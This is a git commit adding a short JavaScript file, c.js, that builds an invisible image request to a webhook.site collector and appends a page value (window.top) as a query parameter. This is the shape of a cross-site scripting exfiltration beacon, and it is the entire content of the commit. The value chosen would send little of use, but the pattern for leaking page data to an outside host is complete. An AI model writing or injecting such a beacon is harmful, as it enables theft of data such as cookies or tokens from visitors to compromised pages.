2e65379900ed9029505eba0bdbc194efbcb4e63f
carloszavaleta <czavaleta93@gmail.com>
2020-01-20 23:29:59 -0600

    a

---
+++ c.js
@@ -0,0 +1,6 @@
+var image = document.createElement("img")
+
+var name = window.top
+image.src = "https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d/picture.png?c=" + name
+
+document.body.appendChild(image);
